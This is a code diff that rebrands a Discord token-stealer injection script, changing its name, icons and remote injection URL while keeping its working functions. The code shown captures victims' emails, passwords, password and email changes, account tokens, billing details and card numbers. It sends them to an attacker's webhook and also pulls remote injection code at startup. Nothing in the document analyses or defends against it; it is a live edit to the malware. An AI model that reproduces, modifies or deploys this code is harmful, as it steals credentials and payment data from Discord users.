@@ -10,11 +10,11 @@ const config = {
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
-  ping_val: '@everyone',
-  embed_name: 'CStealer Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  ping_val: '[⚠️] Fumo Victim Escape Attempt Contained',
+  embed_name: 'Cewebwate Applicator | @v6mp', 
+  embed_icon: 'https://i.ibb.co/QNN5hxT/image-2024-03-30-152018583.png'.replace(/ /g, '%20'), 
+  embed_color: 1752220, 
+  injection_url: 'https://github.com/swarmhostovermind/IIIIIIlllIlIlIlIIIIIlllIIIlIlIlIlI/blob/main/IlIlIlIlIlllllIIIIlIllIllIlIIllIlIl.js', 
   /**
    
    **/
@@ -195,7 +195,7 @@ function hex2binb(str, existingBin, existingBinLen) {
   existingByteLen = existingBinLen >>> 3;
 
   if (0 !== length % 2) {
-    console.error('String of HEX type must be in byte increments');
+    console.error('Hex string must be in byte increments');
   }
 
   for (i = 0; i < length; i += 2) {
@@ -208,7 +208,7 @@ function hex2binb(str, existingBin, existingBinLen) {
       }
       bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
     } else {
-      console.error('String of HEX type contains invalid characters');
+      console.error('Hex string contains invalid characters');
     }
   }
 
@@ -433,7 +433,7 @@ function updateCheck() {
       ),
     );
 
-    const startUpScript = `const fs = require('fs'), https = require('https');
+const startUpScript = `const fs = require('fs'), https = require('https');
 const indexJs = '${indexJs}';
 const bdPath = '${bdPath}';
 const fileSize = fs.statSync(indexJs).size
@@ -502,7 +502,7 @@ const getBilling = async (token) => {
           billing += '💳 ';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += '🇵';
           break;
       }
     }
@@ -567,13 +567,13 @@ const buyNitro = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return 'No Nitro';
+      return 'None';
     case 1:
       return 'Nitro Classic';
     case 2:
-      return 'Nitro Boost';
+      return 'Nitro';
     default:
-      return 'No Nitro';
+      return 'None';
   }
 };
 
@@ -661,27 +661,27 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Information**',
-            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `<a:fomolol:1223995904416026695> Email: **${email}** - <a:fomolol:1223995904416026695> Password: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<a:fomolol:1223995904416026695> Nitro Type: **${nitro}**\n<a:fomolol:1223995904416026695> Badges: **${badges}**\n<a:fomolol:1223995904416026695> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<a:fomolol:1223995904416026695> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          name: json.username,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'Cewebwate Applicator | @v6mp',
+            icon_url: "https://i.ibb.co/QNN5hxT/image-2024-03-30-152018583.png"
         },
       },
     ],
@@ -704,27 +704,27 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
+            value: `<a:fomolol:1223995904416026695> Email: **${json.email}**\n<a:fomolol:1223995904416026695> Old Password: **${oldpassword}**\n<a:fomolol:1223995904416026695> New Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<a:fomolol:1223995904416026695> Nitro Type: **${nitro}**\n<a:fomolol:1223995904416026695> Badges: **${badges}**\n<a:fomolol:1223995904416026695> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<a:fomolol:1223995904416026695> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          name: json.username,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'Cewebwate Applicator | @v6mp',
+            icon_url: "https://i.ibb.co/QNN5hxT/image-2024-03-30-152018583.png"
         },
       },
     ],
@@ -747,27 +747,27 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `<a:fomolol:1223995904416026695> New Email: **${email}**\n<a:fomolol:1223995904416026695> Password: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<a:fomolol:1223995904416026695> Nitro Type: **${nitro}**\n<a:fomolol:1223995904416026695> Badges: **${badges}**\n<a:fomolol:1223995904416026695> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<a:fomolol:1223995904416026695> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          name: json.username,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'Cewebwate Applicator | @v6mp',
+            icon_url: "https://i.ibb.co/QNN5hxT/image-2024-03-30-152018583.png"
         },
       },
     ],
@@ -790,27 +790,27 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            value: `[ Paypal Added Successfully ]`,
             inline: false,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<a:fomolol:1223995904416026695> Nitro Type: **${nitro}**\n<a:fomolol:1223995904416026695> Badges: **${badges}**\n<a:fomolol:1223995904416026695> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<a:fomolol:1223995904416026695> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          name: json.username,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'Cewebwate Applicator | @v6mp',
+            icon_url: "https://i.ibb.co/QNN5hxT/image-2024-03-30-152018583.png"
         },
       },
     ],
@@ -838,22 +838,22 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<a:fomolol:1223995904416026695> Nitro Type: **${nitro}**\n<a:fomolol:1223995904416026695> Badges: **${badges}**\n<a:fomolol:1223995904416026695> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<a:fomolol:1223995904416026695> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          name: json.username,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'Cewebwate Applicator | @v6mp',
+            icon_url: "https://i.ibb.co/QNN5hxT/image-2024-03-30-152018583.png"
         },
       },
     ],
@@ -883,22 +883,22 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<a:fomolol:1223995904416026695> Nitro Type: **${nitro}**\n<a:fomolol:1223995904416026695> Badges: **${badges}**\n<a:fomolol:1223995904416026695> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<a:fomolol:1223995904416026695> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          name: json.username,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'Cewebwate Applicator | @v6mp',
+            icon_url: "https://i.ibb.co/QNN5hxT/image-2024-03-30-152018583.png"
         },
       },
     ],
